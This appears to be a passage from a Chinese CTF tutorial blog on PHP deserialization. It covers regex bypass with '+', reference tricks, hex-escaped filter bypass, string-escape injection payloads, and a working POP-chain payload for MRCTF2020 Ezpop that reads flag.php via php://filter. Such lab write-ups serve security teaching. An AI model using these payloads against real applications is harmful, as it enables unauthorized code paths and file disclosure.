<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;111&quot;;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>输出结果就是 “111”</p>
<h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p>正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^O:\d+/&#x27;)</span><br></pre></td></tr></table></figure>

<p>匹配序列化字符串是否是对象字符串开头</p>
<p>利用加号绕过（在url传参时注意+编码为%2B）</p>
<p><strong>serialize(array( a ) )</strong> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a,<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> test),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">// +号绕过</span></span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>)),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对应 <strong>ctfshow web258</strong></p>
<h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p>
<p><strong>ctfshow 265</strong></p>
<h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br><span class="line"><span class="number">61</span>(<span class="number">16</span>进制)-&gt;<span class="number">97</span>(十进制)-&gt;<span class="title function_ invoke__">a</span>(ASCII)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;    <span class="comment">//搜索字符串的出现</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 未作处理前</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h3><p>1.过滤后字符变多</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line">	<span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个就是将GET传入的name中的 x 改为了 xx</p>
<p>正常传入不含x的name值就会正常显示</p>
<p>例如：?name&#x3D;abc，此时长度为3</p>
<p>如果我们传入abcx，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢出（长度大于4）</p>
<p>进而影响下面的反序列化</p>
<p>我们可以利用这一点来实现字符串逃逸</p>
<p>构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=abcxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p>当我们构造name时，在abc后写20个x，而且后面 “;i:1;s:6:”whoami”;} 也是20的长度</p>
<p>在进行change时，这里的20个x就变成了40个x，刚好符合序列化时的长度</p>
<p>从而造成 <strong>“;i:1;s:6:”whoami”;}</strong> 溢出，前面的”闭合前串，后面的;}闭合反序列化的全过程</p>
<p>而先前存在的**$age**被舍弃（因为这里数组只有两个元素），不影响反序列化的过程</p>
<p><strong>总之，age被我们控制</strong></p>
<p>2.过滤后字符变少</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line">	<span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里将xx替换为x</p>
<p>正常传入 <strong>?name&#x3D;aaa&amp;age&#x3D;18</strong></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021405597.png" alt="image-20231002125445067"></p>
<p>构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=18&quot;;s:3:&quot;age&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;age&quot;;s:28:&quot;18</span><br></pre></td></tr></table></figure>

<p>注意 <strong>“;s:3:”age”;s:28:</strong> 这一部分本来就有，后面的 <strong>18”;s:3:”age”;s:6:”whoami”;}</strong> 为我们所构造的</p>
<p>age被我们控制</p>
<p><strong>ctfshow web262</strong></p>
<h2 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h2><p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p>
<p>前提需要满足两个条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、unserialize的参数可控。</span><br><span class="line"><span class="number">2</span>、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;23456&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出<code>23456</code></p>
<h2 id="POP链的构造利用"><a href="#POP链的构造利用" class="headerlink" title="POP链的构造利用"></a>POP链的构造利用</h2><h3 id="POP链简单介绍"><a href="#POP链简单介绍" class="headerlink" title="POP链简单介绍"></a>POP链简单介绍</h3><p>前面的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p>MRCTF2020-Ezpop</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//当尝试将对象调用为函数时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>  <span class="variable">$b</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;   <span class="comment">//当调用一个不存在的或者是无法访问的属性的时候被调用</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>共有3个类，反序列化会调用__wakeup，存在于Show类</p>
<p>__wake中的**$this-&gt;source<strong>可控，也就是Show中</strong>$source**变量可控</p>
<p>思路：将**$source<strong>构造成一个对象Show，当</strong>$source<strong>为一个对象时。就会执行Show类中的</strong>__toString**</p>
<p>此时将**$str<strong>指向</strong>Test类**</p>
<p><strong>$this-&gt;str-&gt;source</strong>：取str类中的source值，使这个值自动调用**__get**</p>
<p>此时将$p构造成new Modifier</p>
<p>return $function() 表示将function当作函数返回</p>
<p>当类变量直接当作函数调用的时候，就会调用魔术方法**__invoke**</p>
<p>然后将$va构造成读取源码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = &#x27;php://filter/read=convert.base64-encode/recource=flag.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;memory_limit&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

